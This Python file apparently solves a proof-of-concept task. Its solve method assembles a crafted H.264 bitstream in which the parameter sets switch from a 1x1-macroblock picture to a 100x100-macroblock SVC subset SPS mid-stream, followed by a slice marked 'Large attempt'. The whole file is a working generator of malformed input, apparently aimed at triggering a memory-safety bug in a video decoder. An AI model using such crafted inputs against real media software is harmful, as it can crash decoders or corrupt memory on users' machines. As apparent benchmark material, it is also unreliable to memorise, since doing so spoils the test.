import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        class BitStream:
            def __init__(self):
                self.data = bytearray()
                self.byte = 0
                self.bits_left = 8
            def write_bit(self, b):
                if b: self.byte |= (1 << (self.bits_left - 1))
                self.bits_left -= 1
                if self.bits_left == 0:
                    self.data.append(self.byte); self.byte = 0; self.bits_left = 8
            def write_bits(self, val, n):
                for i in range(n): self.write_bit((val >> (n - 1 - i)) & 1)
            def write_ue(self, val):
                val += 1
                width = val.bit_length() - 1
                for _ in range(width): self.write_bit(0)
                self.write_bits(val, width + 1)
            def write_se(self, val):
                self.write_ue(-2 * val if val <= 0 else 2 * val - 1)
            def get_data(self):
                if self.bits_left < 8: self.data.append(self.byte)
                return self.data

        def rbsp_to_ebsp(rbsp):
            out = bytearray()
            z = 0
            for b in rbsp:
                if z == 2 and b <= 3:
                    out.append(3); z = 0
                out.append(b)
                z = z + 1 if b == 0 else 0
            return out

        def make_nal(nt, rbsp):
            return b'\x00\x00\x00\x01' + bytes([(3 << 5) | nt]) + rbsp_to_ebsp(rbsp)

        # 1. SPS (Small: 1x1 MB)
        bs = BitStream()
        bs.write_bits(66, 8); bs.write_bits(0, 8); bs.write_bits(30, 8); bs.write_ue(0)
        bs.write_ue(0); bs.write_ue(0); bs.write_ue(0); bs.write_ue(1); bs.write_bit(0)
        bs.write_ue(0); bs.write_ue(0) # 1x1 MBs
        bs.write_bit(1); bs.write_bit(0); bs.write_bit(0); bs.write_bit(0); bs.write_bit(1)
        sps = bs.get_data()

        # 2. PPS
        bs = BitStream()
        bs.write_ue(0); bs.write_ue(0); bs.write_bit(0); bs.write_bit(0); bs.write_ue(0)
        bs.write_ue(0); bs.write_ue(0); bs.write_bit(0); bs.write_bits(0, 2)
        bs.write_se(0); bs.write_se(0); bs.write_se(0); bs.write_bit(0); bs.write_bit(0)
        bs.write_bit(0); bs.write_bit(1)
        pps = bs.get_data()

        # 3. Subset SPS (Large: 100x100 MBs)
        bs = BitStream()
        bs.write_bits(83, 8); bs.write_bits(0, 8); bs.write_bits(30, 8); bs.write_ue(0)
        bs.write_ue(1); bs.write_ue(0); bs.write_ue(0); bs.write_bit(0); bs.write_bit(0)
        bs.write_ue(0); bs.write_ue(0); bs.write_ue(0); bs.write_ue(1); bs.write_bit(0)
        bs.write_ue(99); bs.write_ue(99) # 100x100 MBs
        bs.write_bit(1); bs.write_bit(0); bs.write_bit(0); bs.write_bit(0)
        # SVC Extension
        bs.write_bit(1); bs.write_bits(0, 2); bs.write_bit(0); bs.write_bits(1, 2)
        bs.write_bit(0); bs.write_bits(1, 2); bs.write_se(0); bs.write_se(0)
        bs.write_se(0); bs.write_se(0); bs.write_bit(0); bs.write_bit(0)
        bs.write_bit(0); bs.write_bit(0); bs.write_bit(0); bs.write_bit(1)
        subsps = bs.get_data()

        # 4. Slice 1 (IDR, Small)
        bs = BitStream()
        bs.write_ue(0); bs.write_ue(7); bs.write_ue(0); bs.write_bits(0, 4)
        bs.write_ue(0); bs.write_bits(0, 4); bs.write_bit(0); bs.write_bit(0)
        bs.write_se(0); bs.write_bit(1)
        slice1 = bs.get_data()

        # 5. Slice 2 (Non-IDR, Large attempt)
        bs = BitStream()
        bs.write_ue(0); bs.write_ue(7); bs.write_ue(0); bs.write_bits(1, 4)
        bs.write_bits(0, 4); bs.write_bit(0); bs.write_se(0); bs.write_bit(1)
        slice2 = bs.get_data()

        return make_nal(7, sps) + make_nal(8, pps) + make_nal(5, slice1) + make_nal(15, subsps) + make_nal(1, slice2)
